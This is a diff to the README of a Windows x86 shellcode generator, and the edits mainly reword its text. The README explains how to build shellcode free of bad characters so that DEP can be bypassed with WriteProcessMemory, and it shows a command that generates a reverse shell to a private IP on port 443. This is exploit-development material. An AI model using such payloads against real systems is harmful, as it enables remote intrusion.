@@ -4,8 +4,7 @@
 
 ```
 $ python3 win_x86_shellcoder.py -h
-usage: win_x86_shellcoder.py [-h] [-b BADCHARS] [-r] [-w] [-e {process,thread,none}]
-                             {reverse,bind,exec,egghunter,loadfile} ...
+usage: win_x86_shellcoder.py [-h] [-b BADCHARS] [-r] [-w] [-e {process,thread,none}] {reverse,bind,exec,egghunter,loadfile} ...
 
 Windows x86 Shellcode Generator
 
@@ -31,22 +30,21 @@ options:
 
 ## Bypass DEP with WriteProcessMemory
 
-This tool was created to facilitate the development of shellcode that does not contain bad characters and does not require decoding to bypass DEP with [WriteProcessMemory](https://docs.microsoft.com/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory).
+This tool was created to facilitate developing shellcodes that do not contain bad characters and do not require decoding to bypass DEP with [WriteProcessMemory](https://docs.microsoft.com/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory).
 
-If [VirtualAlloc](https://docs.microsoft.com/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc) or [VirtualProtect](https://docs.microsoft.com/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect) cannot be used and WriteProcessMemory must be used, encoders that perform dynamic decoding such as shikata_ga_nai will likely not work.
-
-It will not work because the address to which WriteProcessMemory writes the shellcode will remain not writable, making it impossible to write dynamically decoded shellcode.
+Suppose [VirtualAlloc](https://docs.microsoft.com/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc) or [VirtualProtect](https://docs.microsoft.com/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect) cannot be used and WriteProcessMemory must be used. In that case, encoders that perform dynamic decoding such as shikata_ga_nai will likely not work because the address to which WriteProcessMemory writes the shellcode will remain not writable, making it impossible to write dynamically decoded shellcode.
 
 One solution to this problem is to develop a shellcode that does not contain bad characters and does not require decoding.
 
 
 ## Find Bad Characters
 
-`-b` is an option to specify bad characters. The specified bad characters are automatically removed from function name hashes, etc., in shellcode. If any remaining bad characters cannot be removed, the output will indicate which instructions contain bad characters as `[x]`.
+`-b` is an option to specify bad characters. The specified bad characters are automatically removed from function name hashes and some instructions in the shellcode. If any remaining bad characters cannot be removed, the output will indicate which instructions contain bad characters as `[x]`.
 
 ```
 $ python3 win_x86_shellcoder.py -b '\x00\x0a\x0d\x20\x30' reverse -i 192.168.1.120 -p 443
-# shellcode size: 0x151 (337)
+...
+# bad chars were found in the shellcode
 ...
 [ ] 60           : pushal
 [ ] 31c9         : xor ecx, ecx
